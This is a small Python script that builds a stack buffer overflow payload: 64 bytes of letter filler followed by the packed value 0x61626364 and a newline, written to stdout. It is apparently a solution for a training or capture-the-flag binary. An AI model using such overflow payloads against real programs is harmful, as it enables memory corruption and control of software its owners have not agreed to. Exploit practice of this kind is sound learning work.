#!/usr/bin/env python3
import struct
import sys
def create_pattern(chunks, chunk_size=4):
    pattern = [chr(i).encode() for i in range(ord('A'), ord('z')+1)]
    return b''.join(map(lambda x: x * chunk_size, pattern))[:chunks*chunk_size]


buf = create_pattern(0x10)
buf += struct.pack('I', 0x61626364)
buf += b'\n\0'


sys.stdout.buffer.write(buf)
sys.stdout.flush()
sys.stdout.close()
exit()
